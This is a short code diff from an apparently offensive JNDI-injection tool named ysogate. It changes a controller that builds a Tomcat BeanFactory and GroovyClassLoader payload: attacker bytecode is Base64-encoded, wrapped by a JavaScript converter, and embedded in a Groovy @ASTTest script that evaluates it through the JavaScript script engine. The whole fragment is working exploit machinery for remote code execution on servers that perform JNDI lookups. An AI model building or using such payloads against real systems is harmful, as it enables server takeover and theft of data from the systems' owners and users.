@@ -5,7 +5,8 @@ import com.h2tg.ysogate.annotation.JNDIMapping;
 import com.h2tg.ysogate.controller.BasicController;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
-import static com.h2tg.ysogate.controller.bypass.converter.EvalConverter.LoadByJS2;
+import java.util.Base64;
+import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;
 
 @JNDIController
 @JNDIMapping("/GroovyClassLoader")
@@ -15,7 +16,7 @@ public class GroovyClassLoaderController extends BasicController {
         byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");
 
-        String code = LoadByJS2(byteCode);
+        String code = all(Base64.getEncoder().encodeToString(byteCode));
 
         String script = "@groovy.transform.ASTTest(value={\n" +
                 "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")\n" +
